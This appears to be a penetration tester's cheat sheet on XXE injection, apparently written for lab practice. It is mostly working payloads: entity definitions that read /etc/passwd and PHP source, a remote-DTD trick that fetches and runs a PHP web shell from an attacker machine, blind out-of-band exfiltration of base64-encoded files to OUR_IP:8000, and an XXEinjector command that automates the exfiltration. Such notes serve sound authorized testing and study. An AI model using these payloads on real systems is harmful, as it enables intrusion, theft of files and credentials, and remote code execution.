* https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity

**Note:** Some web applications may default to a JSON format in HTTP request, but may still accept other formats, including XML. So, even if a web app sends requests in a JSON format, we can try changing the `Content-Type` header to `application/xml`, and then convert the JSON data to XML with an [online tool](https://www.convertjson.com/json-to-xml.htm). If the web application does accept the request with XML data, then we may also test it against XXE vulnerabilities, which may reveal an unanticipated XXE vulnerability.
## Local file disclosure

Inject XML code:
```xml
<!DOCTYPE email [
  <!ENTITY company SYSTEM "file:///etc/passwd">
  ]> 
  .
  .
  .
  <email>&company;</email>
```

Use php, data wrappers from [[File inclusion]] such as convert.base64-encode filter to leak php source code files.

RCE: Use `<!ENTITY company SYSTEM "http://ip:port/shell.php">` where ip:port is attacker machine and shell.php is `<?php system($_REQUEST["cmd"]);?>` to retreive and execute php web shell.

## Using CDATA

Useful for doing leaking source code files for a web application without executing them or binary data without breaking XML format.

Create `xxe.dtd` on attack machine and host it on a web server:
```xml
<!ENTITY joined "%begin;%file;%end;">
```

Inject XML code:
```xml
<!DOCTYPE email [
  <!ENTITY % begin "<![CDATA["> <!-- prepend the beginning of the CDATA tag -->
  <!ENTITY % file SYSTEM "file:///var/www/html/submitDetails.php"> <!-- reference external file -->
  <!ENTITY % end "]]>"> <!-- append the end of the CDATA tag -->
  <!ENTITY % xxe SYSTEM "http://OUR_IP:8000/xxe.dtd"> <!-- reference our external DTD -->
  %xxe;
]>
...
<email>&joined;</email> <!-- reference the &joined; entity to print the file content -->
```

## Error Based XXE

Cause a deliberate error in the XML process and disclose files in the error.

Create `xxe.dtd` on attack machine and host it on a web server:
  ```xml
<!ENTITY % file SYSTEM "file:///etc/hosts">
<!ENTITY % error "<!ENTITY content SYSTEM '%nonExistingEntity;/%file;'>">
```
Inject XML code:
```xml
<!DOCTYPE email [ 
  <!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd">
  %remote;
  %error;
]>
```

## Blind XXE
  
Perform blind XXE by exfiltrating base64 encoded file to attacker's web server.
 
Create `xxe.dtd` on attack machine and host it on a web server:
```xml
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % oob "<!ENTITY content SYSTEM 'http://OUR_IP:8000/?content=%file;'>">
```

Inject XML code: 
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [ 
  <!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd">
  %remote;
  %oob;
]>
<root>&content;</root>
```

## Automated XXE

[XXEinjector](https://github.com/enjoiz/XXEinjector)

HTTP post req file for XXE. `XXEINJECT` is the position locator for the tool
```
POST /blind/submitDetails.php HTTP/1.1
Host: 10.129.201.94
Content-Length: 169
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)
Content-Type: text/plain;charset=UTF-8
Accept: */*
Origin: http://10.129.201.94
Referer: http://10.129.201.94/blind/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

<?xml version="1.0" encoding="UTF-8"?>
XXEINJECT
```

Command for XXEinjector for out of band exfiltration of passwd file:
`ruby XXEinjector.rb --host=[tun0 IP] --httpport=8000 --file=/tmp/xxe.req --path=/etc/passwd --oob=http --phpfilter`

Read file contents from log after executing command:
`cat Logs/10.129.201.94/etc/passwd.log`